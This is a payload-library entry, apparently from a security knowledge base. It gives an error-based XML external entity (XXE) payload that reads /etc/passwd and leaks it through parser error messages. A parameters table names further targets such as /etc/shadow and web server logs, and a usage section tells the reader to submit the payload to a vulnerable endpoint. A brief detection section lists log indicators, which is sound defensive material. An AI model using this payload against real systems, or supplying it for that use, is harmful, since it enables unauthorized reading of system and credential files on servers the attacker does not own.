---
type: code
language: xml
verified: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
tags:
  - xxe
  - error-based
  - file-read
  - payload
platforms:
  - Web
  - Linux
validated: true
---

# Error-Based-XXE-File-Read-Payload

## Code

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Description

This advanced XXE payload uses parameter entities to indirectly reference a local file (/etc/passwd) and force an error during resolution. The %eval entity defines another entity (%error) that points to a non-existent path incorporating the file content, causing the parser to include the file data in the error message for disclosure.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | Path to the target local file for disclosure | file:///etc/shadow or file:///var/log/apache2/access.log |
| file:///nonexistent/ | Non-existent base path to trigger the error | file:///tmp/nonexistent/ |

## Usage

Embed this within a larger XML document and submit to a vulnerable endpoint. The payload tricks the parser into evaluating the file content in an error context, leaking it in the response. Ideal for blind XXE scenarios where direct output is not echoed; adjust the file path for different targets.

## Detection

- Error logs containing file contents or unexpected paths like /etc/passwd.
- Anomalous entity definitions (%eval, %error) in XML input logs.
- Increased XML parsing errors correlated with specific inputs.

## Related

- [[procedures/Error-Based-XXE-Injection-Attack]]
